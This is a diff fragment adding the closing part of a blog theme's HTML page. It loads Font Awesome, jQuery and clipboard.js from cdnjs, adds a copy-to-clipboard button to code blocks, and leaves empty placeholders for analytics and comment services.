+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
